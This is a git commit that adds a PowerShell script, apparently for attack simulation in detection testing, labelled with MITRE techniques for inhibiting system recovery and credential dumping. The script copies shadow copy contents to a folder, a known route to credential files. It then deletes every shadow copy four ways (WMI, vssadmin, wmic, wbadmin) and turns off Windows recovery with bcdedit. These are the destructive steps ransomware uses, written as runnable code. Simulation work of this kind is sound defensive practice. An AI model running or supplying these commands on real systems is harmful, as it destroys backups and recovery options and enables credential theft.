02eec804905fe49dc441fc3241d7e0cefcc9faff
mthcht <mathieuchotplassot@gmail.com>
2023-01-15 00:33:35 +0100

    Create backup_and_delete_shadowcopy.ps1

---
+++ Simulation/Windows/System/backup_and_delete_shadowcopy.ps1
@@ -0,0 +1,45 @@
+<#
+    T1490 - Inhibit System Recovery
+    T1003 - OS Credential Dumping
+    - Create a shadowcopy
+    - List all the shadow copies, create a symlink for each of them and copy the content of each shadowcopy to a "backup" folder
+    - delete all shadow copies and disable automatic shadowcopy
+#>
+
+# Create a shadow copy method 1
+(gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')
+
+$destination = $args[0]
+if (-not $destination) {
+    $destination = ".\"
+}
+
+if (!(Test-Path -Path $destination)) { 
+    New-Item -ItemType Directory -Path $destination
+}
+
+#get the list of shadowcopies
+$shadows = Get-WmiObject -Class Win32_ShadowCopy
+
+#create a symbolic link of each shadowcopy and copy the content of each shadowcopy into a bacup folder in the choosen directory (choose a directory with enought space)
+foreach ($shadow in $shadows) {
+    $date = (Get-Date).ToUniversalTime().Subtract([datetime]'1/1/1970').TotalSeconds
+	$shadowPath = $shadow.DeviceObject + "\"
+    $destinationlnk = $destination + "\$date" + "_shadow_copy_" + $shadow.ID
+    cmd.exe /c mklink /d $destinationlnk $shadowPath
+    Copy-Item $destinationlnk -Destination $destination\backup\ -Recurse
+}
+
+#Delete all shadow copy
+#method 1
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+#method 2
+vssadmin.exe delete shadows /all /quiet
+#method 3
+wmic shadowcopy delete
+#method 4
+wbadmin.exe delete catalog -quiet
+
+# disable automatic Windows recovery features by modifying boot configuration data
+bcdedit.exe /set bootstatuspolicy ignoreallfailures
+bcdedit.exe /set recoveryenabled No
